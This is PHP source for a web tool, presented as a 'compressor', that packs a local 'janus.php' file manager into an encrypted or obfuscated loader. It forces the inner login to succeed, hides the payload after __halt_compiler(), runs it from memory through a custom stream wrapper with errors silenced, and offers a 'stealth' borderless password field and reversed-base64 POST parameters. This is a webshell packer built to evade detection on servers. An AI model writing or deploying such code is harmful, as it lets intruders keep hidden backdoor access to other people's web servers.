<?php
/**
 * Janus File Compressor & Obfuscator - Specialized for Janus.PHP (obf_janus.php)
 * Automatically detects janus.php in the local directory and compiles it using AES-256, Stream, or Temp engines.
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

$obfuscated_code = null;
$obfuscated_filename = null;
$error_message = null;
$original_preview = null;
$success_message = null;
$engine = 'aes';

// Helper to format bytes
if (!function_exists('formatBytes')) {
    function formatBytes($bytes) {
        if ($bytes < 1024) return $bytes . ' B';
        if ($bytes < 1048576) return round($bytes / 1024, 1) . ' KB';
        return round($bytes / 1048576, 2) . ' MB';
    }
}

// Check if janus.php exists locally
$local_janus_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'janus.php';
$local_janus_exists = file_exists($local_janus_path);
$local_janus_size = $local_janus_exists ? filesize($local_janus_path) : 0;

// Try to auto-detect the password from janus.php
$detected_password = 'admin'; // Default fallback
if ($local_janus_exists) {
    $janus_content = file_get_contents($local_janus_path);
    if (preg_match("/define\(\s*['\"]PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $janus_content, $matches)) {
        $detected_password = $matches[1];
    }
}

$requestMethod = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : '';

// Handle obfuscation POST
if ($requestMethod === 'POST' && isset($_POST['compress_local']) && $_POST['compress_local'] === '1') {
    $source = '';
    $original_name = '';
    
    if ($local_janus_exists) {
        $source = file_get_contents($local_janus_path);
        $original_name = 'janus.php';
    } else {
        $error_message = 'Local janus.php file not found.';
    }

    if ($source !== '') {
        $original_preview = $source;
        $engine = isset($_POST['engine']) ? $_POST['engine'] : 'aes';
        $password = (isset($_POST['key']) && trim($_POST['key']) !== '') ? $_POST['key'] : $detected_password;

        $custom_output_filename = null;
        if (isset($_POST['output_filename']) && trim($_POST['output_filename']) !== '') {
            $custom_output_filename = basename(trim($_POST['output_filename']));
            if (pathinfo($custom_output_filename, PATHINFO_EXTENSION) !== 'php') {
                $custom_output_filename .= '.php';
            }
        }

        // Strip opening PHP tag
        $code = preg_replace('/^' . chr(60) . '\\?(php)?\\s*/i', '', $source);
        // Strip trailing close tag
        $code = preg_replace('/\\?' . chr(62) . '\\s*$/', '', $code);

        // Automatically bypass inner login screen of Janus file manager
        $code = str_replace('$authenticated = false;', '$authenticated = true;', $code);
        $code = preg_replace(
            "/define\(\s*['\"]PASSWORD['\"]\s*,\s*['\"].*?['\"]\s*\)/i",
            "define('PASSWORD', '" . addslashes($password) . "')",
            $code
        );

        if ($engine === 'stream') {
            // Bitwise NOT + Memory Stream Wrapper (Safe & Diskless)
            $encoded = ~$code;
            
            $stub_template = '<?php
error_reporting(0);
if(!class_exists(\'VS\')){
  class VS{
    public $context;
    private $p=0;
    private $d;
    public function stream_open($path,$mode,$options,&$opened_path){
      $url=parse_url($path);
      $var=$url[\'host\'];
      $this->d=$GLOBALS[$var];
      $this->p=0;
      return true;
    }
    public function stream_read($count){
      $ret=substr($this->d,$this->p,$count);
      $this->p+=strlen($ret);
      return $ret;
    }
    public function stream_eof(){
      return $this->p>=strlen($this->d);
    }
    public function stream_stat(){
      return array();
    }
    public function stream_set_option($opt,$a1,$a2){
      return false;
    }
  }
  stream_wrapper_register(\'vs\',\'VS\');
}
$h=fopen(__FILE__,\'r\');
fseek($h,{{OFFSET}});
$d=stream_get_contents($h);
fclose($h);
$GLOBALS[\'data\']="<?php\n".~$d;
include \'vs://data\';
__halt_compiler();';

            // Iteratively calculate correct fseek offset
            $offset = 0;
            for ($i = 0; $i < 20; $i++) {
                $stub = str_replace('{{OFFSET}}', strval($offset), $stub_template);
                $new_offset = strlen($stub);
                if ($new_offset === $offset) {
                    break;
                }
                $offset = $new_offset;
            }
            $stub = str_replace('{{OFFSET}}', strval($offset), $stub_template);
            $obfuscated_code = $stub . $encoded;
            $obfuscated_filename = ($custom_output_filename !== null) ? $custom_output_filename : 'janus_obf.php';
            
        } elseif ($engine === 'temp') {
            // Strrev + Temp File (High Compatibility)
            $encoded = strrev($code);
            
            $stub_template = '<?php
error_reporting(0);
$h = fopen(__FILE__, \'r\');
fseek($h, {{OFFSET}});
$d = stream_get_contents($h);
fclose($h);
$c = strrev($d);
$t = tempnam(sys_get_temp_dir(), \'p_\');
file_put_contents($t, "<?php\n" . $c);
include $t;
@unlink($t);
__halt_compiler();';

            // Iteratively calculate correct fseek offset
            $offset = 0;
            for ($i = 0; $i < 20; $i++) {
                $stub = str_replace('{{OFFSET}}', strval($offset), $stub_template);
                $new_offset = strlen($stub);
                if ($new_offset === $offset) {
                    break;
                }
                $offset = $new_offset;
            }
            $stub = str_replace('{{OFFSET}}', strval($offset), $stub_template);
            $obfuscated_code = $stub . $encoded;
            $obfuscated_filename = ($custom_output_filename !== null) ? $custom_output_filename : 'janus_obf.php';
            
        } else {
            // AES-256 Encryption (Password Gated)
            $key = hash('sha256', $password, true);
            
            // Add sentinel check so the loader knows if decryption was successful
            $plain = 'JANUS_OK' . $code;
            
            $iv_len = openssl_cipher_iv_length('aes-256-cbc');
            $iv = openssl_random_pseudo_bytes($iv_len);
            $encrypted = openssl_encrypt($plain, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
            $encoded = $iv . $encrypted;

            $stealth = isset($_POST['stealth']) && $_POST['stealth'] === '1';
            
            $login_html = $stealth ? 
                '<form name="f" method="POST"><input style="border:0px" type="password" name="p"></form>' : 
                '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Encrypted Console</title>
    <style>
        body {
            background-color: #1a1f29;
            color: #d1d5db;
            font-family: Consolas, Monaco, "Courier New", monospace;
            font-size: 13px;
            margin: 0;
            padding: 0;
        }
        .login-box {
            max-width: 320px;
            margin: 150px auto;
            background-color: #11151d;
            border: 1px solid #374151;
            padding: 25px;
            border-radius: 6px;
            text-align: center;
        }
        .form-input {
            background-color: #111827;
            border: 1px solid #374151;
            color: #ffffff;
            padding: 6px 10px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
            margin-top: 10px;
            outline: none;
        }
        .form-input:focus {
            border-color: #3b82f6;
        }
        .login-btn {
            background-color: #3b82f6;
            border: 1px solid #2563eb;
            color: #ffffff;
            padding: 7px 20px;
            cursor: pointer;
            font-family: inherit;
            border-radius: 4px;
            font-size: 13px;
            width: 100%;
            margin-top: 15px;
        }
        .login-btn:hover {
            background-color: #2563eb;
        }
        .toast-notify {
            background-color: #111827;
            border: 1px solid #374151;
            padding: 10px;
            border-radius: 4px;
            color: #EF4444;
            margin-bottom: 15px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h3 style="margin-top:0; color:#fff;">Janus File Manager</h3>
        
        <?php if (isset($error)): ?>
            <div class="toast-notify">
                <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>
        
        <form method="post">
            <div style="text-align: left;">
                <label style="font-size: 11px; color:#9ca3af; text-transform: uppercase;">Password</label>
                <input type="password" name="p" class="form-input" placeholder="Enter password" required autofocus>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
    </div>
</body>
</html>';
            $stub_template = '<?php
error_reporting(0);
@session_start();
if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\' && isset($_POST[\'payload\'])) {
    $pl_dec = base64_decode(strrev($_POST[\'payload\']));
    if ($pl_dec !== false) {
        $p_arr = array();
        parse_str($pl_dec, $p_arr);
        $_POST = $p_arr;
    }
}
if ((isset($_POST[\'action\']) && $_POST[\'action\'] === \'logout\') || (isset($_GET[\'action\']) && $_GET[\'action\'] === \'logout\')) {
    unset($_SESSION[\'obf_key\']);
    @session_destroy();
    setcookie(\'fm_auth\', \'\', time() - 3600, \'/\', \'\', false, true);
    header("Location: " . $_SERVER[\'PHP_SELF\']);
    exit;
}
if(!class_exists(\'VS\')){
  class VS{
    public $context;
    private $p=0;
    private $d;
    public function stream_open($path,$mode,$options,&$opened_path){
      $url=parse_url($path);
      $var=$url[\'host\'];
      $this->d=$GLOBALS[$var];
      $this->p=0;
      return true;
    }
    public function stream_read($count){
      $ret=substr($this->d,$this->p,$count);
      $this->p+=strlen($ret);
      return $ret;
    }
    public function stream_eof(){
      return $this->p>=strlen($this->d);
    }
    public function stream_stat(){
      return array();
    }
    public function stream_set_option($opt,$a1,$a2){
      return false;
    }
  }
  stream_wrapper_register(\'vs\',\'VS\');
}
$h=fopen(__FILE__,\'r\');
fseek($h,{{OFFSET}});
$d=stream_get_contents($h);
fclose($h);
$run = false;
$error = null;
if (isset($_POST[\'p\'])) {
    $pass = $_POST[\'p\'];
    $key = hash(\'sha256\', $pass, true);
    $iv_len = 16;
    $iv = substr($d, 0, $iv_len);
    $ct = substr($d, $iv_len);
    $dec = openssl_decrypt($ct, \'aes-256-cbc\', $key, OPENSSL_RAW_DATA, $iv);
    if ($dec !== false && substr($dec, 0, 8) === \'JANUS_OK\') {
        $_SESSION[\'obf_key\'] = $pass;
        setcookie(\'fm_auth\', hash(\'sha256\', $pass), time() + 86400 * 7, \'/\', \'\', false, true);
        $_COOKIE[\'fm_auth\'] = hash(\'sha256\', $pass);
        $GLOBALS[\'data\'] = "<?php\n" . substr($dec, 8);
        $run = true;
    } else {
        $error = "Incorrect password.";
    }
} elseif (isset($_SESSION[\'obf_key\'])) {
    $pass = $_SESSION[\'obf_key\'];
    $key = hash(\'sha256\', $pass, true);
    $iv_len = 16;
    $iv = substr($d, 0, $iv_len);
    $ct = substr($d, $iv_len);
    $dec = openssl_decrypt($ct, \'aes-256-cbc\', $key, OPENSSL_RAW_DATA, $iv);
    if ($dec !== false && substr($dec, 0, 8) === \'JANUS_OK\') {
        setcookie(\'fm_auth\', hash(\'sha256\', $pass), time() + 86400 * 7, \'/\', \'\', false, true);
        $_COOKIE[\'fm_auth\'] = hash(\'sha256\', $pass);
        $GLOBALS[\'data\'] = "<?php\n" . substr($dec, 8);
        $run = true;
    } else {
        unset($_SESSION[\'obf_key\']);
    }
}
if ($run) {
    include \'vs://data\';
    exit;
}
?>' . "\n" . $login_html . "\n" . '<?php __halt_compiler();';

            // Iteratively calculate correct fseek offset
            $offset = 0;
            for ($i = 0; $i < 20; $i++) {
                $stub = str_replace('{{OFFSET}}', strval($offset), $stub_template);
                $new_offset = strlen($stub);
                if ($new_offset === $offset) {
                    break;
                }
                $offset = $new_offset;
            }
            $stub = str_replace('{{OFFSET}}', strval($offset), $stub_template);
            $obfuscated_code = $stub . $encoded;
            $obfuscated_filename = ($custom_output_filename !== null) ? $custom_output_filename : 'janus_encrypted.php';
        }
        $success_message = 'Janus file manager encrypted and secured successfully!';
    }
}

// Handle download request
if ($requestMethod === 'POST' && isset($_POST['download_code'])) {
    $code_to_download = base64_decode($_POST['download_code']);
    $fname = isset($_POST['download_name']) ? $_POST['download_name'] : 'obfuscated.php';
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($fname) . '"');
    header('Content-Length: ' . strlen($code_to_download));
    echo $code_to_download;
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Janus Packaging Tool</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #080710;
            --bg-secondary: #0f0e1a;
            --bg-card: rgba(25, 22, 45, 0.65);
            --bg-card-hover: rgba(35, 30, 60, 0.75);
            --border-color: rgba(255, 255, 255, 0.08);
            --text-primary: #f3f4f6;
            --text-secondary: #9ca3af;
            --text-dim: #6b7280;
            --accent-purple: #8b5cf6;
            --accent-pink: #ec4899;
            --accent-cyan: #06b6d4;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --gradient-primary: linear-gradient(135deg, #8b5cf6, #ec4899);
            --gradient-secondary: linear-gradient(135deg, #06b6d4, #8b5cf6);
            --gradient-bg: radial-gradient(ellipse at 10% 20%, rgba(139, 92, 246, 0.12) 0%, transparent 55%),
                           radial-gradient(ellipse at 90% 80%, rgba(236, 72, 153, 0.08) 0%, transparent 55%);
            --shadow-glow: 0 0 50px rgba(139, 92, 246, 0.18);
            --radius-lg: 24px;
            --radius-md: 16px;
            --radius-sm: 10px;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
            line-height: 1.6;
            background-image: var(--gradient-bg);
            background-attachment: fixed;
        }

        /* Ambient grid pattern */
        .grid-overlay {
            position: fixed;
            inset: 0;
            z-index: 0;
            pointer-events: none;
            background-image:
                linear-gradient(rgba(255, 255, 255, 0.012) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 255, 255, 0.012) 1px, transparent 1px);
            background-size: 50px 50px;
        }

        .container {
            position: relative;
            z-index: 1;
            max-width: 650px;
            margin: 0 auto;
            padding: 50px 20px 100px;
        }

        /* Header UI */
        .header {
            text-align: center;
            margin-bottom: 40px;
            animation: fadeInDown 0.8s ease-out;
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-25px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header__badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 18px;
            background: rgba(139, 92, 246, 0.12);
            border: 1px solid rgba(139, 92, 246, 0.25);
            border-radius: 100px;
            font-size: 11px;
            font-weight: 700;
            color: #c084fc;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 20px;
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.1);
        }

        .header__badge .dot {
            width: 7px;
            height: 7px;
            background: var(--accent-green);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.85); }
        }

        .header h1 {
            font-size: clamp(1.8rem, 5vw, 2.8rem);
            font-weight: 900;
            background: var(--gradient-primary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1.2;
            margin-bottom: 15px;
            letter-spacing: -1px;
        }

        .header p {
            font-size: 14px;
            color: var(--text-secondary);
            max-width: 500px;
            margin: 0 auto;
        }

        /* Glassmorphic card styling */
        .card {
            background: var(--bg-card);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-lg);
            padding: 35px;
            margin-bottom: 30px;
            transition: border-color 0.3s, box-shadow 0.3s;
            animation: fadeInUp 0.7s ease-out backwards;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card:hover {
            border-color: rgba(139, 92, 246, 0.22);
            box-shadow: var(--shadow-glow);
        }

        .card__title {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            font-weight: 800;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 20px;
        }

        .card__title .icon {
            width: 34px;
            height: 34px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--gradient-primary);
            border-radius: var(--radius-sm);
            font-size: 18px;
            color: white;
            box-shadow: 0 4px 10px rgba(139, 92, 246, 0.2);
        }

        /* Local File Detection Box */
        .local-detect-box {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(139, 92, 246, 0.05);
            border: 1px solid rgba(139, 92, 246, 0.18);
            border-radius: var(--radius-md);
            padding: 20px 24px;
            margin-bottom: 30px;
            gap: 20px;
            flex-wrap: wrap;
        }

        .local-detect-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .local-detect-info__icon {
            font-size: 32px;
            color: #c084fc;
        }

        .local-detect-info__details h4 {
            font-size: 15px;
            font-weight: 700;
            margin-bottom: 2px;
        }

        .local-detect-info__details p {
            font-size: 12px;
            color: var(--text-secondary);
        }

        /* Settings fields */
        .setting-field {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .setting-field label {
            font-size: 11px;
            font-weight: 700;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .select-input {
            width: 100%;
            background-color: rgba(15, 14, 26, 0.8);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            border-radius: var(--radius-sm);
            padding: 12px 16px;
            font-family: inherit;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        .select-input:focus {
            border-color: var(--accent-purple);
        }
        
        select.select-input {
            cursor: pointer;
        }

        .btn-submit {
            display: block;
            width: 100%;
            padding: 16px 32px;
            background: var(--gradient-primary);
            color: white;
            border: none;
            border-radius: var(--radius-md);
            font-family: inherit;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.2);
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.35);
        }

        /* Error/Success elements */
        .alert {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 14px 18px;
            border-radius: var(--radius-sm);
            font-size: 14px;
            margin-bottom: 25px;
            animation: shake 0.4s ease-out;
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.08);
            border: 1px solid rgba(239, 68, 68, 0.2);
            color: var(--accent-red);
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.08);
            border: 1px solid rgba(16, 185, 129, 0.2);
            color: var(--accent-green);
            animation: fadeInUp 0.4s ease-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            50% { transform: translateX(6px); }
            75% { transform: translateX(-4px); }
        }

        /* Output View */
        .output-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 15px;
        }

        .output-stats {
            display: flex;
            gap: 25px;
        }

        .stat {
            display: flex;
            flex-direction: column;
        }

        .stat__label {
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-dim);
        }

        .stat__value {
            font-size: 18px;
            font-weight: 800;
            font-family: 'JetBrains Mono', monospace;
        }

        .stat__value.original { color: var(--text-secondary); }
        .stat__value.obfuscated { color: #d8b4fe; }
        .stat__value.ratio { color: var(--accent-cyan); }

        .output-actions {
            display: flex;
            gap: 10px;
        }

        .btn-action {
            padding: 10px 18px;
            border-radius: var(--radius-sm);
            font-family: inherit;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            border: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .btn-download {
            background: var(--gradient-primary);
            color: white;
            box-shadow: 0 4px 10px rgba(139, 92, 246, 0.2);
        }

        .btn-download:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 18px rgba(139, 92, 246, 0.3);
        }

        .btn-copy {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }

        .btn-copy:hover {
            background: rgba(255, 255, 255, 0.09);
        }

        .btn-copy.copied {
            background: rgba(16, 185, 129, 0.12);
            border-color: rgba(16, 185, 129, 0.3);
            color: var(--accent-green);
        }

        .code-preview {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-md);
            overflow: hidden;
        }

        .code-preview__header {
            display: flex;
            align-items: center;
            padding: 12px 18px;
            background: rgba(255, 255, 255, 0.02);
            border-bottom: 1px solid var(--border-color);
        }

        .code-preview__dots {
            display: flex;
            gap: 6px;
        }

        .code-preview__dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }

        .code-preview__dot--red { background: #ff5f56; }
        .code-preview__dot--yellow { background: #ffbd2e; }
        .code-preview__dot--green { background: #27c93f; }

        .code-preview__filename {
            flex: 1;
            text-align: center;
            font-size: 12px;
            color: var(--text-dim);
            font-family: 'JetBrains Mono', monospace;
            padding-right: 42px; /* balance offset */
        }

        .code-preview pre {
            padding: 20px;
            overflow-x: auto;
            max-height: 380px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.6;
            color: #d1d5db;
        }

        .payload-indicator {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            background: rgba(236, 72, 153, 0.08);
            border-radius: 4px;
            font-size: 11px;
            color: var(--accent-pink);
            font-weight: 600;
            margin-top: 10px;
            border: 1px solid rgba(236, 72, 153, 0.15);
        }

        .section-desc {
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .pwd-badge {
            background: rgba(139, 92, 246, 0.15);
            border: 1px solid rgba(139, 92, 246, 0.3);
            color: #d8b4fe;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            display: inline-block;
            margin-top: 4px;
        }

        .spec-box {
            flex-direction: column;
            align-items: flex-start;
            gap: 15px;
            background: rgba(139, 92, 246, 0.04);
            border-color: rgba(139, 92, 246, 0.2);
            width: 100%;
            box-sizing: border-box;
        }

        .spec-box.missing {
            background: rgba(239, 68, 68, 0.03);
            border-color: rgba(239, 68, 68, 0.15);
        }

        .btn-spec-action {
            margin-top: 10px;
            background: var(--gradient-primary);
        }

        input[type="checkbox"] {
            width: auto !important;
            height: auto !important;
            margin-top: 0 !important;
            padding: 0 !important;
            cursor: pointer;
        }

        /* How it works grid */
        .steps {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-top: 10px;
        }

        .step {
            padding: 20px;
            background: rgba(255, 255, 255, 0.015);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-md);
            transition: all 0.3s;
        }

        .step:hover {
            border-color: rgba(139, 92, 246, 0.15);
            background: rgba(139, 92, 246, 0.03);
            transform: translateY(-2px);
        }

        .step__num {
            width: 26px;
            height: 26px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--gradient-primary);
            border-radius: 50%;
            font-size: 12px;
            font-weight: 800;
            margin-bottom: 12px;
        }

        .step__title {
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .step__desc {
            font-size: 12px;
            color: var(--text-dim);
            line-height: 1.4;
        }

        .footer {
            text-align: center;
            margin-top: 50px;
            padding-top: 25px;
            border-top: 1px solid var(--border-color);
            font-size: 12px;
            color: var(--text-dim);
        }
    </style>
</head>
<body>

<div class="grid-overlay"></div>

<div class="container">

    <!-- Header -->
    <header class="header">
        <div class="header__badge">
            <span class="dot"></span>
            Janus Packaging Tool
        </div>
        <h1>Janus.PHP Compiler</h1>
        <p>A specialized packaging utility designed to compress, secure, and encrypt the local <code>janus.php</code> file manager.</p>
    </header>

    <?php if ($error_message): ?>
        <div class="alert alert-error">
            <span>&#9888;&#65039;</span>
            <span><?php echo htmlspecialchars($error_message); ?></span>
        </div>
    <?php endif; ?>

    <?php if ($success_message): ?>
        <div class="alert alert-success">
            <span>&#9989;</span>
            <span><?php echo htmlspecialchars($success_message); ?></span>
        </div>
    <?php endif; ?>

    <?php if ($obfuscated_code === null): ?>
        <!-- Section: Encryption specially for Janus.PHP -->
        <div class="card">
            <div class="card__title">
                <span class="icon">🔒</span>
                Encryption specially for Janus.PHP
            </div>
            <p class="section-desc">Instantly encrypt, compress, or package the local <code>janus.php</code> file manager script.</p>
            
            <?php if ($local_janus_exists): ?>
                <div class="local-detect-box spec-box">
                    <div class="local-detect-info">
                        <span class="local-detect-info__icon">⚡</span>
                        <div class="local-detect-info__details">
                            <h4>Detected local file manager</h4>
                            <p style="margin-bottom: 5px;">File: <code>janus.php</code> (<?php echo formatBytes($local_janus_size); ?>)</p>
                            <p>Password auto-detected from file: <code class="pwd-badge"><?php echo htmlspecialchars($detected_password); ?></code></p>
                        </div>
                    </div>
                    
                    <form method="post" style="width: 100%;">
                        <input type="hidden" name="compress_local" value="1">
                        
                        <div class="setting-field" style="margin-bottom: 15px; width: 100%;">
                            <label for="engineSelectLocal">Compression Engine:</label>
                            <select name="engine" id="engineSelectLocal" class="select-input">
                                <option value="aes" selected>AES-256 Encryption (Password Gated)</option>
                                <option value="stream">Bitwise NOT + Memory Stream Wrapper (Safe &amp; Diskless)</option>
                                <option value="temp">Strrev + Temp-File Include (Legacy Compatibility)</option>
                            </select>
                        </div>

                        <div class="setting-field" id="passwordFieldLocal" style="margin-bottom: 15px; width: 100%;">
                            <label for="keyInputLocal">Decryption Password (Optional):</label>
                            <input type="text" name="key" id="keyInputLocal" class="select-input" placeholder="Leave blank to use auto-detected password">
                        </div>

                        <div class="setting-field" style="margin-bottom: 15px; width: 100%;">
                            <label for="filenameInputLocal">Output Filename (Optional):</label>
                            <input type="text" name="output_filename" id="filenameInputLocal" class="select-input" placeholder="Leave blank for default (e.g. janus_encrypted.php)">
                        </div>

                        <div class="setting-field" id="stealthFieldLocal" style="margin-bottom: 15px; flex-direction: row; align-items: center; gap: 8px; display: none;">
                            <input type="checkbox" name="stealth" id="stealthLocal" value="1">
                            <label for="stealthLocal" style="cursor: pointer; text-transform: none; font-weight: 500; font-size: 13px; margin: 0;">Use hidden login form (borderless input only)</label>
                        </div>

                        <button type="submit" class="btn-submit btn-spec-action">
                            🔒 Encrypt &amp; Package Janus.PHP
                        </button>
                    </form>
                </div>
            <?php else: ?>
                <div class="local-detect-box spec-box missing">
                    <div class="local-detect-info">
                        <span class="local-detect-info__icon">⚠️</span>
                        <div class="local-detect-info__details">
                            <h4>janus.php not detected</h4>
                            <p>Place the <code>janus.php</code> file manager script in the same directory as this obfuscator to enable one-click specialized encryption.</p>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    <?php else: ?>
        <!-- Completed Compression View -->
        <?php
            $orig_size = strlen($original_preview);
            $obf_size = strlen($obfuscated_code);
            $ratio = round($obf_size / max($orig_size, 1) * 100);
            $hc_needle = '__halt_compiler();';
            $halt_pos = strpos($obfuscated_code, $hc_needle);
            if ($halt_pos !== false) {
                $stub_display = substr($obfuscated_code, 0, $halt_pos + strlen($hc_needle));
                $binary_len = $obf_size - strlen($stub_display);
            } else {
                $stub_display = $obfuscated_code;
                $binary_len = 0;
            }
        ?>
        <div class="card">
            <div class="card__title">
                <span class="icon">&#128293;</span>
                Compression Complete
            </div>

            <div class="output-header">
                <div class="output-stats">
                    <div class="stat">
                        <span class="stat__label">Original</span>
                        <span class="stat__value original"><?php echo formatBytes($orig_size); ?></span>
                    </div>
                    <div class="stat">
                        <span class="stat__label">Compressed</span>
                        <span class="stat__value obfuscated"><?php echo formatBytes($obf_size); ?></span>
                    </div>
                    <div class="stat">
                        <span class="stat__label">Ratio</span>
                        <span class="stat__value ratio"><?php echo $ratio; ?>%</span>
                    </div>
                </div>

                <div class="output-actions">
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="download_code" value="<?php echo base64_encode($obfuscated_code); ?>">
                        <input type="hidden" name="download_name" value="<?php echo htmlspecialchars($obfuscated_filename); ?>">
                        <button type="submit" class="btn-action btn-download">&#11015;&#65039;&nbsp; Download</button>
                    </form>
                    <button class="btn-action btn-copy" id="btnCopy" data-code="<?php echo base64_encode($obfuscated_code); ?>">&#128203;&nbsp; Copy Stub</button>
                </div>
            </div>

            <div class="code-preview">
                <div class="code-preview__header">
                    <div class="code-preview__dots">
                        <span class="code-preview__dot code-preview__dot--red"></span>
                        <span class="code-preview__dot code-preview__dot--yellow"></span>
                        <span class="code-preview__dot code-preview__dot--green"></span>
                    </div>
                    <span class="code-preview__filename"><?php echo htmlspecialchars($obfuscated_filename); ?></span>
                </div>
                <pre><code><?php echo htmlspecialchars($stub_display); ?></code></pre>
            </div>

            <?php if ($binary_len > 0): ?>
                <div class="payload-indicator">
                    <?php if ($engine === 'aes'): ?>
                        🔒 + <?php echo formatBytes($binary_len); ?> of encrypted binary payload appended
                    <?php else: ?>
                        🛡️ + <?php echo formatBytes($binary_len); ?> of obfuscated binary payload appended
                    <?php endif; ?>
                </div>
            <?php else: ?>
                <div class="payload-indicator" style="background: rgba(139, 92, 246, 0.08); border-color: rgba(139, 92, 246, 0.15); color: #c084fc;">
                    🔒 AES-256 password-encrypted code payload (base64 embedded inside stub string)
                </div>
            <?php endif; ?>

            <div style="margin-top: 30px; text-align: center;">
                <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" style="color: #c084fc; font-weight: 600; text-decoration: none; font-size: 14px;">&larr; Package another file</a>
            </div>
        </div>
    <?php endif; ?>

    <!-- Technical Architecture -->
    <div class="card">
        <div class="card__title">
            <span class="icon">&#9881;&#65039;</span>
            Technical Architecture
        </div>
        <div class="steps">
            <?php if ($engine === 'aes'): ?>
                <div class="step">
                    <div class="step__num">1</div>
                    <div class="step__title">Encrypt</div>
                    <div class="step__desc">Source code is encrypted with AES-256-CBC using the SHA256 password hash as key.</div>
                </div>
                <div class="step">
                    <div class="step__num">2</div>
                    <div class="step__title">Append</div>
                    <div class="step__desc">The raw encrypted binary payload is appended directly after <code>__halt_compiler();</code>.</div>
                </div>
                <div class="step">
                    <div class="step__num">3</div>
                    <div class="step__title">Stream Wrapper</div>
                    <div class="step__desc">The loader stub registers a custom in-memory stream wrapper (<code>vs://</code>) for secure loading.</div>
                </div>
                <div class="step">
                    <div class="step__num">4</div>
                    <div class="step__title">Decrypt &amp; Run</div>
                    <div class="step__desc">At execution, loader prompts for password, decrypts payload in memory, and runs via <code>include</code>.</div>
